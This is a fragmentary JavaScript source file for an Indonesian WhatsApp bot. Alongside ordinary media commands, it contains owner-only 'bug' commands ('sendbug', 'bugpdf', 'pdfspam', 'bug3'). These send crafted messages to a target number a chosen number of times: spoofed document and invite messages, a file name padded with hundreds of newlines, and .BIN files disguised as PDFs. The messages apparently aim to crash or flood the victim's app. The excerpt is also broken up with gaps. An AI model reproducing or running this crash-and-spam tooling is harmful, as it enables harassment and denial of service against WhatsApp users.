...
var xeonytimewisher = `Good Morning 🌄`
		...
		if (isEval && senderNumber == "6289687537657") {
			let evaled,
				text = q,
...
//Fake
		...
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6289687537657-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
...
break
                    case 'tohd': {
                    if (!quoted) return replygcxeon(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
                    m.replygcxeon(mess.wait)
                    const media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                    const { TelegraPh } = require('./lib/uploader')
                    const anu = await TelegraPh(media)
                    await 
                    XeonBotInc.sendMessage(m.chat, { image: { url: `https://api.botcahx.live/api/tools/remini?url=https://telegra.ph/file/82af204d1258df1d52cac.jpg&apikey=${APIkeys}&img=${anu}` }, caption: mess.success}, { quoted: m})
                    }
                    break
                    case 'remini': {
...
*Link* : https://www.youtube.com/@basreng33`},
{quoted: m})
        break
        case 'oke':
case 'okey':
...
if (!q) return replygcxeon(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,5`)
let orang = q.split(',')[0]
let jumlah = q.split(',')[1]
if (!orang) return replygcxeon(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,5`)
if (!jumlah) return replygcxeon(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,5`)
if (isNaN(parseInt(jumlah))) return replygcxeon('Jumlah wajib angka!!')
let targetnya = orang.replace(/[^0-9]/g, '')
let jumlahnya = `${encodeURI(jumlah)}`
var cekap = await XeonBotInc.onWhatsApp(targetnya + '@s.whatsapp.net')
let target = targetnya+'@s.whatsapp.net'
if (cekap.length == 0) return replygcxeon(`Nomor tersebut tidak terdaftar di WhatsApp\nSilahkan kirim nomor yg valid.`)
...
await sleep(2000)
sendviewOnce(target)
XeonBotInc.sendMessage(from, {text:`${command} target @${target.split('@')[0]}, berhasil✅`, mentions: [target]})
await sleep(2000)
}
break
case "sendbug": {
if (!XeonTheCreator) return XeonBotInc.sendImageAsSticker(from, fs.readFileSync('./baselins/stickernye/owner.webp'), m, { packname: 'LinsBotz', author: 'sabar ya\njangan lupa bantu follow\nyt: @LinsBotz\nig: rijalsavior' }, { quoted: m})
...
XeonBotInc.sendImageAsSticker(from, fs.readFileSync('./baselins/stickernye/wait.webp'), m, { packname: 'LinsBotz', author: 'sabar ya\njangan lupa bantu follow\nyt: @LinsBotz\nig: rijalsavior' }, { quoted: m})
await sleep(1000)
sendBug2(target,jumlahnya)
await sleep(2000)
sendviewOnce(target)
XeonBotInc.sendImageAsSticker(from, fs.readFileSync('./baselins/stickernye/sukses.webp'), m, { packname: 'Pesanan Telah Selesai', author: 'Jangan Lupa Follow me\nyoutube: @LinsBotz\nig: rijalsavior' }, { quoted: m})
await sleep(2000)
}
break
case 'animek': {
...
XeonBotInc.sendMessage(m.chat, { video: { url: json.thumbnail }, caption: cap }, { quoted: m})
};
break
...
if (!XeonTheCreator) return m.reply("_Only Owner");
...
if (tete == '6281351692548') return m.reply(`napa ke owner gw banh?`)
if (tete == '62882020177294') return m.reply(`napa ke owner gw banh?`)
let jumlah = q.split("|")[1]
...
XeonBotInc.sendMessage(target, {text: command}, {quoted: stik})
}
await XeonBotInc.sendMessage(m.chat, {react: {text: `✅`, key: m.key}})
m.reply("_Done_")
}
...
const hay = q.split("|")[1]
const groupMetadataa = !m.isGroup? await XeonBotInc.groupMetadata(`${q.split("|")[0]}`).catch(e => {}) : ""
...
await XeonBotInc.sendMessage(sender, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: "Sukses Tinggal Save Ya Kakak", mimetype: "text/vcard", }, { quoted: m })
...
𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗯𝗲 𝗬𝗧 :
_https://www.youtube.com/@basreng33
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
`
...
break
case 'pdfspam':{
if (!XeonTheCreator) return m.reply(from)
...
XeonBotInc.sendMessage(m.chat, { document: anuin, mimetype: 'application/octet-stream', fileName: `𝐏𝐀𝐍𝐍 𝐓𝐇𝐄 𝐄𝐌𝐏𝐄𝐑𝐎𝐑 𝐒𝐈𝐆𝐍𝐄𝐃 ダフ ${place}.BIN`, title: `𝐏𝐀𝐍𝐍 𝐓𝐇𝐄 𝐄𝐌𝐏𝐄𝐑𝐎𝐑 𝐒𝐈𝐆𝐍𝐄𝐃 ダフ.BIN` }, { quoted: pak })
}
break
//=================================================//
case 'bugpdf':{
if (!XeonTheCreator) return m.reply(from)
anuin = fs.readFileSync('./basetzy/mytzy/ngeselin.BIN')
XeonBotInc.sendMessage(m.chat, { document: anuin, mimetype: 'application/pdf', fileName: `𝐏𝐀𝐍𝐍 𝐓𝐇𝐄 𝐄𝐌𝐏𝐄𝐑𝐎𝐑 𝐒𝐈𝐆𝐍𝐄𝐃 ダフ ${place}.pdf`, title: `𝐏𝐀𝐍𝐍 𝐓𝐇𝐄 𝐄𝐌𝐏𝐄𝐑𝐎𝐑 𝐒𝐈𝐆𝐍𝐄𝐃 ダフ.pdf` }, { quoted: pak })
}
break
//Document
const fdoc = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `${ownername}`,jpegThumbnail: thumb}}}
const bacot = (jid, text, quoted = fdoc) => XeonBotInc.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `𝐏𝐀𝐍𝐍 𝐓𝐇𝐄 𝐄𝐌𝐏𝐄𝐑𝐎𝐑 𝐒𝐈𝐆𝐍𝐄𝐃 ダフ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./basetzy/gambarnye/pict.jpg'), sourceUrl: `https://youtube.com/c/PakTzy` }}}, { quoted })
//=================================================//
// VN m.chat
case 'bug3': {
if (!XeonTheCreator) throw m.reply(from)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./basetzy/gambarnye/theXeonBotInc.jpg') }, { upload: XeonBotInc.waUploadToServer })
...
"pageCount": 0,
"mediaKey": "inQAnlhVJdu5dMUKr86iWUJnG/umzHeUGrlD7qqAN/I=",
"fileName": `‍🍷꙰͜͡𝐏𝐀𝐍𝐍 𝐓𝐇𝐄 𝐄𝐌𝐏𝐄𝐑𝐎𝐑 𝐒𝐈𝐆𝐍𝐄𝐃 ダフ💸̷⃨⃛\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${mata1}.jpeg`,
"fileEncSha256": "Ndb8qq5fOJW56Hn8bB3+NNvxfTnZtrVnPM97Ak3ON+c=",
"directPath": "/v/t62.7119-24/30623311_146834807959315_9176799642226465389_n.enc?ccb=11-4&oh=01_AVxHWupe_fRozKysLEUfowD0Z_apYBve1H3C_MGsaD4mCw&oe=630DC76C",
"mediaKeyTimestamp": "1659416157",
}
...
ydd = `Hallo Im HuTao`
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./basetzy/gambarnye/pict.jpg') }, { upload: XeonBotInc.waUploadToServer })
